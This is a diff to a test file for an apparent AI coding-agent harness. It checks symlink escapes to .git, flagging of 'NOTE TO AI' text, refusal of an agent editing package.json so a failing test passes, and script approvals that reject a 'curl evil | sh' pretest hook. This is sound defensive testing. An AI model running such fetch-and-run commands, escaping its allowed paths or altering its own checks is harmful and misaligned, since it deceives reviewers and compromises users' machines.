@@ -21,6 +21,7 @@ const { AgentRunner, parsePlan, branchName, MAX_ATTEMPTS } = require(path.join(o
 const { TaskStore } = require(path.join(out, 'taskStore'));
 const { renderTaskBody } = require(path.join(out, 'agentPage'));
 const { taskGroup } = require(path.join(out, 'types'));
+const { ScriptApprovals, scriptCommand, describeScript } = require(path.join(out, 'agentView'));
 
 const token = { isCancellationRequested: false };
 const git = (cwd, ...args) => execFileSync('git', args, { cwd, encoding: 'utf8' }).trim();
@@ -73,7 +74,7 @@ function toolLimits() {
   const root = makeRepo();
   const dirty = new Set();
   const ran = [];
-  const host = { root, isDirty: file => dirty.has(file), allowedScripts: ['test'], runScript: async script => { ran.push(script); return { script, passed: true, exitCode: 0, output: '', durationMs: 1 }; } };
+  const host = { root, isDirty: file => dirty.has(file), allowedScripts: () => ['test'], runScript: async script => { ran.push(script); return { script, passed: true, exitCode: 0, output: '', durationMs: 1 }; } };
   return (async () => {
     const workspace = new StepWorkspace(host, { tools: ['edit_file', 'create_file', 'run_check'], paths: ['src/'] });
     const outcome = async (name, input) => workspace.invoke(name, input);
@@ -83,6 +84,14 @@ function toolLimits() {
     fs.symlinkSync(os.tmpdir(), path.join(root, 'src', 'out'));
     assert.match((await outcome('read_file', { path: 'src/out/anything' })).content, /may not leave|No such/);
     assert.match((await outcome('create_file', { path: 'src/out/evil.js', content: 'x' })).content, /may not leave/);
+    // A link inside an allowed folder that leads to .git or to a file the step may not change.
+    fs.symlinkSync('../.git', path.join(root, 'src', 'meta'));
+    fs.symlinkSync('../README.md', path.join(root, 'src', 'readme-link.md'));
+    assert.match((await outcome('edit_file', { path: 'src/meta/config', oldText: '[core]', newText: '[x]' })).content, /\.git folder is not available/);
+    assert.match((await outcome('read_file', { path: 'src/meta/HEAD' })).content, /\.git folder is not available/);
+    assert.match((await outcome('edit_file', { path: 'src/readme-link.md', oldText: '# Demo', newText: '# X' })).content, /leads to README\.md, which is not among the paths/);
+    assert.equal(fs.readFileSync(path.join(root, 'README.md'), 'utf8').startsWith('# Demo'), true);
+    fs.rmSync(path.join(root, 'src', 'meta')); fs.rmSync(path.join(root, 'src', 'readme-link.md'));
     assert.match((await outcome('edit_file', { path: 'README.md', oldText: '#', newText: '##' })).content, /not among the paths/);
     dirty.add(path.join(root, 'src', 'retry.js'));
     assert.match((await outcome('edit_file', { path: 'src/retry.js', oldText: '1', newText: '3' })).content, /unsaved changes/);
@@ -96,6 +105,10 @@ function toolLimits() {
     assert.ok(readme.ok && /1: # Demo/.test(readme.content));
     assert.equal(workspace.aiText.length, 1, 'text speaking to an AI is flagged');
     assert.ok((await outcome('search_code', { query: 'attempts' })).content.includes('src/retry.js:1:'));
+    // Text speaking to an AI that the model sees through a search is flagged too.
+    const searcher = new StepWorkspace(host, { tools: [], paths: [] });
+    await searcher.invoke('search_code', { query: 'NOTE TO AI' });
+    assert.deepEqual(searcher.aiText.map(item => [item.path, item.line]), [['README.md', 2]]);
     assert.ok((await outcome('list_files', {})).content.includes('src/'));
     assert.ok(!(await outcome('list_files', {})).content.includes('.git/'));
     // Edits and creations keep the first "before"; reverting puts it back, but never over a later change.
@@ -154,7 +167,11 @@ async function wholeTask() {
   store.onDidChange(() => changed++);
   const turns = [];
   const router = scripted(turns);
-  const approved = [];
+  // The real approvals (by command, hooks included), on an in-memory store.
+  const memory = new Map();
+  const approvals = new ScriptApprovals({ get: key => memory.get(key), update: async (key, value) => { memory.set(key, value); } });
+  const scriptsOf = dir => JSON.parse(fs.readFileSync(path.join(dir, 'package.json'), 'utf8')).scripts;
+  const approve = (...names) => approvals.approve(root, scriptsOf(root), names);
   const dirty = new Set();
   const host = {
     router,
@@ -165,7 +182,7 @@ async function wholeTask() {
     },
     isDirty: file => dirty.has(file),
     scripts: dir => JSON.parse(fs.readFileSync(path.join(dir, 'package.json'), 'utf8')).scripts,
-    allowedScripts: () => approved,
+    allowedScripts: dir => approvals.allowed(dir, scriptsOf(dir)),
     runScript
   };
   const runner = new AgentRunner(store, host);
@@ -187,7 +204,7 @@ async function wholeTask() {
 
   // Approval needs the checks' scripts approved and a clean tree; then the branch is created.
   await assert.rejects(runner.approvePlan(task.id), /not approved for this repository: test/);
-  approved.push('test');
+  await approve('test');
   fs.writeFileSync(path.join(root, 'src', 'retry.js'), 'module.exports = { attempts: 0 };\n');
   await assert.rejects(runner.approvePlan(task.id), /uncommitted changes/);
   git(root, 'checkout', '--', 'src/retry.js');
@@ -212,7 +229,7 @@ async function wholeTask() {
   assert.deepEqual(result.changes.map(change => change.path), ['src/retry.js'], 'the edit outside the step paths was refused');
   assert.equal(result.toolCalls[1].ok, false);
   assert.equal(result.checks[0].passed, false);
-  assert.throws(() => runner.accept(task.id), /Checks failed: test/);
+  await assert.rejects(runner.accept(task.id), /Checks failed: test/);
   const page = renderTaskBody(current, store.readLog(task.id), 'Model <b>');
   assert.match(page, /data-action="accept" disabled title="A check failed"/);
   assert.match(page, /Model &lt;b&gt;/);
@@ -232,7 +249,7 @@ async function wholeTask() {
   assert.deepEqual(retryCall.tools, ['read_file', 'list_files', 'search_code', 'edit_file']);
   current = store.get(task.id);
   assert.equal(current.plan[0].result.checks[0].passed, true);
-  runner.accept(task.id);
+  await runner.accept(task.id);
   current = store.get(task.id);
   assert.equal(current.status, 'done');
   assert.equal(current.plan[0].attempts, 2);
@@ -244,10 +261,10 @@ async function wholeTask() {
   for (const type of ['model', 'tool', 'approval', 'check', 'status']) { assert.ok(types.has(type), `run log has ${type}`); }
   assert.deepEqual(log.filter(entry => entry.type === 'approval').map(entry => entry.action), ['approvePlan', 'run', 'retry', 'run', 'accept']);
   assert.ok(changed > 5);
-  return { root, store, runner, turns, host, approved, dirty, storage };
+  return { root, store, runner, turns, host, approve, dirty, storage };
 }
 
-async function failuresAndRecovery({ root, store, runner, turns, host, approved }) {
+async function failuresAndRecovery({ root, store, runner, turns, host, approve }) {
   git(root, 'commit', '-q', '-am', 'step 1');
   const task = store.create({ title: 'Second', goal: 'g', criteria: ['c'], repositoryRoot: root });
   turns.push({ final: { steps: [{ title: 'A', intent: 'a', tools: ['edit_file'], paths: ['src/'], checks: [] }, { title: 'B', intent: 'b', tools: [], paths: [], checks: [] }] } });
@@ -306,19 +323,21 @@ async function failuresAndRecovery({ root, store, runner, turns, host, approved 
   assert.doesNotMatch(renderTaskBody(store.get(third.id), [], 'm'), /acceptAnyway/, 'no Accept anyway without a failed check');
 
   // Accept anyway: a check that already failed before the task (this test always fails).
-  runner.accept(third.id);
+  await runner.accept(third.id);
   git(root, 'switch', '-q', 'main');
   fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ scripts: { test: 'node -e "process.exit(1)"' } }));
   git(root, 'commit', '-q', '-am', 'a failing test');
-  approved.length = 0; approved.push('test');
+  // A changed command is no longer approved until it is approved again.
+  assert.equal(host.allowedScripts(root).includes('test'), false);
+  await approve('test');
   const fifth = store.create({ title: 'Fifth', goal: 'g', criteria: ['c'], repositoryRoot: root });
   turns.push({ final: { steps: [{ title: 'A', intent: 'a', tools: ['edit_file'], paths: ['src/'], checks: ['test'] }] } });
   await runner.plan(fifth.id, token);
   await runner.approvePlan(fifth.id);
   turns.push({ tool: 'edit_file', input: { path: 'src/retry.js', oldText: 'attempts: 1', newText: 'attempts: 4' } }, { final: { summary: 'x' } });
   await runner.runStep(fifth.id, token);
-  assert.throws(() => runner.accept(fifth.id), /accept it anyway/);
-  runner.accept(fifth.id, { anyway: true });
+  await assert.rejects(runner.accept(fifth.id), /accept it anyway/);
+  await runner.accept(fifth.id, { anyway: true });
   const accepted = store.get(fifth.id);
   assert.equal(accepted.status, 'done');
   assert.deepEqual(accepted.plan[0].acceptedDespite, ['test']);
@@ -326,6 +345,64 @@ async function failuresAndRecovery({ root, store, runner, turns, host, approved 
   const anyway = store.readLog(fifth.id).find(entry => entry.action === 'acceptAnyway');
   assert.equal(anyway.detail, 'failing: test');
   assert.match(renderTaskBody(accepted, [], 'm'), /failing: test/);
+
+  // A step may not change the command of a check it runs: the check is not run.
+  const sixth = store.create({ title: 'Sixth', goal: 'g', criteria: ['c'], repositoryRoot: root });
+  git(root, 'checkout', '-q', '--', '.');
+  git(root, 'switch', '-q', 'main');
+  turns.push({ final: { steps: [{ title: 'A', intent: 'a', tools: ['edit_file', 'run_check'], paths: ['package.json'], checks: ['test'] }] } });
+  await runner.plan(sixth.id, token);
+  await runner.approvePlan(sixth.id);
+  turns.push({ tool: 'edit_file', input: { path: 'package.json', oldText: 'process.exit(1)', newText: 'process.exit(0)' } },
+    { tool: 'run_check', input: { script: 'test' } }, { final: { summary: 'Made the test pass.' } });
+  await runner.runStep(sixth.id, token);
+  let review = store.get(sixth.id);
+  assert.equal(review.status, 'stepReview');
+  assert.match(review.plan[0].result.toolCalls[1].note, /must be approved again/);
+  assert.equal(review.plan[0].result.checks[0].passed, false);
+  assert.match(review.plan[0].result.checks[0].output, /Not run: the command of "test" changed during the step/);
+
+  // Accepting after switching away from the task's branch is refused.
+  git(root, 'stash', '-q');
+  git(root, 'switch', '-q', 'main');
+  await assert.rejects(runner.accept(sixth.id, { anyway: true }), /switch back to agent\//);
+  git(root, 'switch', '-q', review.branch);
+  git(root, 'stash', 'pop', '-q');
+  runner.retry(sixth.id);
+  assert.equal(JSON.parse(fs.readFileSync(path.join(root, 'package.json'), 'utf8')).scripts.test.includes('process.exit(1)'), true);
+
+  // Two Runs at once: the second is refused, only one model conversation starts.
+  turns.push({ final: { summary: 'once' } });
+  const runs = await Promise.allSettled([runner.runStep(sixth.id, token), runner.runStep(sixth.id, token)]);
+  assert.deepEqual(runs.map(run => run.status).sort(), ['fulfilled', 'rejected']);
+  assert.match(runs.find(run => run.status === 'rejected').reason.message, /The task is stepRunning/);
+  assert.equal(store.get(sixth.id).status, 'stepReview');
+  assert.equal(turns.length, 0);
+  runner.retry(sixth.id);
+
+  // Cancel while a check runs: the script gets the token, and the run ends undone.
+  const cancelling = { isCancellationRequested: false };
+  const realRun = host.runScript;
+  let tokenSeen;
+  host.runScript = async (dir, script, given) => { tokenSeen = given; cancelling.isCancellationRequested = true; return { script, passed: false, exitCode: null, output: 'Cancelled.', durationMs: 1 }; };
+  turns.push({ tool: 'edit_file', input: { path: 'package.json', oldText: '"test"', newText: '"test" ' } }, { final: { summary: 'x' } });
+  await runner.runStep(sixth.id, cancelling);
+  host.runScript = realRun;
+  assert.equal(tokenSeen, cancelling);
+  review = store.get(sixth.id);
+  assert.equal(review.status, 'stepReady');
+  assert.match(review.error, /Cancelled/);
+  assert.equal(git(root, 'status', '--porcelain', '--untracked-files=no'), '', 'the cancelled run was not undone');
+
+  // npm runs pre<name> and post<name> with a script: they are part of what is approved.
+  const hookMemory = new Map();
+  const hooked = new ScriptApprovals({ get: key => hookMemory.get(key), update: async (key, value) => { hookMemory.set(key, value); } });
+  await hooked.approve('/r', { test: 'jest' }, ['test']);
+  assert.deepEqual(hooked.allowed('/r', { test: 'jest' }), ['test']);
+  assert.deepEqual(hooked.allowed('/r', { test: 'jest', pretest: 'curl evil | sh' }), []);
+  assert.deepEqual(hooked.allowed('/r', { test: 'jest --all' }), []);
+  assert.notEqual(scriptCommand({ test: 'a', posttest: 'b' }, 'test'), scriptCommand({ test: 'a' }, 'test'));
+  assert.equal(describeScript({ test: 'jest', pretest: 'tsc' }, 'test'), 'npm run test  →  jest\n    with pretest: tsc');
 
   // A plan the model cannot give.
   const fourth = store.create({ title: 'Fourth', goal: 'g', criteria: ['c'], repositoryRoot: root });
